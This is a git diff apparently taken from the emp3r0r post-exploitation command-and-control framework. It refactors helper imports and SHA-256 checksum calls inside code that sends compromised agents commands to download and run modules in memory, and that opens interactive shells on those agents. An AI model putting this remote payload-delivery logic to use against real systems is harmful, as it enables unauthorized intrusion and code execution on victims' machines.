@@ -12,12 +12,12 @@ import (
 	"github.com/google/uuid"
 	"github.com/jm33-m0/arc"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
-	"github.com/jm33-m0/emp3r0r/core/internal/cli"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/logging"
 	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/internal/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/cli"
+	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/olekukonko/tablewriter"
 )
 
@@ -58,7 +58,7 @@ func moduleCustom() {
 
 	// instead of capturing the output of the command, we use ssh to access the interactive shell provided by the module
 	if config.AgentConfig.IsInteractive {
-		exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
+		exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(emp3r0r_crypto.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
 	}
 
 	// if in-memory module
@@ -131,7 +131,7 @@ func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, envStr,
 		return
 	}
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s --env \"%s\"",
-		emp3r0r_def.C2CmdCustomModule, runtime_def.ActiveModule, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr, envStr)
+		emp3r0r_def.C2CmdCustomModule, runtime_def.ActiveModule, payload_type, util.FileBaseName(hosted_file), emp3r0r_crypto.SHA256SumFile(hosted_file), download_addr, envStr)
 	cmd_id := uuid.NewString()
 	logging.Debugf("Sending command %s to %s", cmd, runtime_def.ActiveAgent.Tag)
 	err = agents.SendCmdToCurrentAgent(cmd, cmd_id)
@@ -157,7 +157,7 @@ func handleCompressedModule(config emp3r0r_def.ModuleConfig, payload_type, exec_
 		logging.Infof("Using cached %s", tarball_path)
 	}
 
-	checksum := tun.SHA256SumFile(tarball_path)
+	checksum := emp3r0r_crypto.SHA256SumFile(tarball_path)
 	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
 		emp3r0r_def.C2CmdCustomModule,
 		runtime_def.ActiveModule, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
@@ -184,7 +184,7 @@ func handleInteractiveModule(config emp3r0r_def.ModuleConfig, cmd_id string) {
 	}
 	args := opt.Val
 	port := strconv.Itoa(util.RandInt(1024, 65535))
-	look_for := tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))
+	look_for := emp3r0r_crypto.SHA256SumRaw([]byte(emp3r0r_def.MagicString))
 
 	for i := 0; i < 10; i++ {
 		if strings.Contains(runtime_def.CmdResults[cmd_id], look_for) {
